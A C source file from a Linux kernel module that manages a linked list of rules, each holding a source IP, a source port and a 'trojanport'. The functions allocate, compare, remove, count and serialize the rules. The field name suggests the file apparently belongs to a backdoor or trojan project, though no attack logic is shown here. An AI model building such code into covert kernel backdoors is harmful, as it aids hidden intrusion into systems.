#include "rule.h"

#include "../../common/utils.h"
#include <linux/slab.h>

rule_t *rule_malloc(void)
{
    rule_t *p = kmalloc(sizeof(rule_t), GFP_ATOMIC);
    if (!p)
    {
        return NULL;
    }
    return p;
}

void rule_free(rule_t *p)
{
    if (!p)
    {
        return;
    }
    kfree(p);
}

void rule_init(rule_t *prule, const char *sip, unsigned short sport, unsigned short trojanport)
{
    prule->sip = ipstr_to_uint(sip);
    prule->sport = sport;
    prule->trojanport = trojanport;
}

void rule_list_init(rule_t *head)
{
    INIT_LIST_HEAD(&head->node);
}

void rule_list_free(rule_t *head)
{
    rule_t *pos, *n;
    list_for_each_entry_safe(pos, n, &head->node, node)
    {
        list_del(&pos->node);
        rule_free(pos);
    }
}

void rule_list_add(rule_t *node, rule_t *head)
{
    list_add_tail(&node->node, &head->node);
}

bool rule_compare(rule_t *rule1, rule_t *rule2)
{
    if (rule1->sip == rule2->sip && rule1->sport == rule2->sport && rule1->trojanport == rule2->trojanport)
    {
        return true;
    }
    return false;
}

void rule_list_remove(rule_t *node, rule_t *head)
{
    rule_t *pos, *n;
    list_for_each_entry_safe(pos, n, &head->node, node)
    {
        if (rule_compare(pos, node))
        {
            list_del(&pos->node);
            rule_free(pos);
            return;
        }
    }
}

unsigned int rule_list_total(rule_t *head)
{
    unsigned int total = 0;

    rule_t *pos, *n;
    list_for_each_entry_safe(pos, n, &head->node, node)
    {
        total++;
    }

    return total;
}

char *rule_list_serialize(rule_t *head)
{
    unsigned int total = rule_list_total(head);
    if (0 == total)
    {
        return NULL;
    }

    char *p = kmalloc(sizeof(rule_t) * total, GFP_ATOMIC);
    if (!p)
    {
        return NULL;
    }

    rule_t *pos, *n;
    int num = 0;
    list_for_each_entry_safe(pos, n, &head->node, node)
    {
        memcpy(p + num * sizeof(rule_t), (char *)pos, sizeof(rule_t));
        num++;
    }

    return p;
}
